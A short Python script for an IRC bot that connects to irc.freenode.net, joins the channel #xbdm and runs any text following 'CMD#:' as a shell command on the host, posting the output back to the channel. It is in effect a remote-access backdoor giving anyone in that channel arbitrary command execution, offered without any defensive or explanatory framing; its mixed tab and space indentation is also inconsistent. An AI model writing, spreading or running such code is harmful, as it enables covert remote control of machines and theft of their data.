#!/usr/bin/python

import socket
import time
import subprocess
import sys

server = "irc.freenode.net"
channel = "#xbdm"
nick = "B0t"

def run_command(command):
        output = ''
        command = command.rstrip()
	output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in iter(output.stdout.readline, ''):
		irc.send("PRIVMSG "+channel+" :"+line)
                sys.stdout.flush()

while 1:

	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while 1:
		try:
			irc.connect((server, 6667))
			break;
		except:
			pass		
	time.sleep(1)
	irc.send("USER "+nick+" "+nick+" "+nick+" :Python B0t1.!! Testing Case\r\n")
	time.sleep(1)
	irc.send("NICK "+nick+"\n")
	time.sleep(1)
	irc.send("JOIN "+channel+"\n")

	while True:
		time.sleep(0.1)
		try: 
			text=irc.recv(2040)
			print(text)
		except Exception:
			pass
		if text.lower().find(":@hi")!=-1:
			irc.send("PRIVMSG "+channel+" :Hello!!\r\n")

		if text.lower().find(":@quit")!=-1:
			irc.close()
			break;
		elif text.find("CMD#:")!=-1:
			print(str(text.split("CMD#:")[-1]))
			run_command(str(text.split("CMD#:")[-1]))
		text = ""
	sys.exit()